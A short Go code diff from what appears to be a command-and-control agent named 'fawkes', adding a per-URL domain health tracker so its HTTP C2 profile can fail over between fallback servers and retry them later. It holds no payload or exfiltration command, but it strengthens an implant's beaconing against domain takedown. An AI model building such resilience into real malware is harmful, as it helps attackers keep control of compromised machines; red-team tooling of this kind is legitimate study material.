@@ -15,6 +15,7 @@ import (
 	"sync/atomic"
 	"time"
 
+	"fawkes/pkg/resilience"
 	"fawkes/pkg/structs"
 )
 
@@ -72,6 +73,10 @@ type HTTPProfile struct {
 	// multiple PostResponse goroutines and the GetTasking loop.
 	activeURLIdx atomic.Int32
 
+	// Domain health tracker — tracks per-URL health for intelligent failover.
+	// Skips known-unhealthy fallback URLs and periodically retries them.
+	tracker *resilience.DomainTracker
+
 	// Config vault — encrypted storage for sensitive C2 fields.
 	// When active, the struct fields above are zeroed and all access
 	// goes through getConfig() which decrypts on demand.
@@ -95,7 +100,7 @@ type HTTPProfile struct {
 }
 
 // NewHTTPProfile creates a new HTTP profile
-func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint, hostHeader, proxyURL, tlsVerify, tlsFingerprint string, fallbackURLs, contentTypes []string) *HTTPProfile {
+func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint, hostHeader, proxyURL, tlsVerify, tlsFingerprint string, fallbackURLs, contentTypes []string, recoverySeconds int) *HTTPProfile {
 	profile := &HTTPProfile{
 		BaseURL:       baseURL,
 		UserAgent:     userAgent,
@@ -109,6 +114,7 @@ func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepI
 		HostHeader:    hostHeader,
 		FallbackURLs:  fallbackURLs,
 		ContentTypes:  contentTypes,
+		tracker:       resilience.NewTracker(1+len(fallbackURLs), 3, recoverySeconds),
 	}
 
 	// Configure TLS based on verification mode
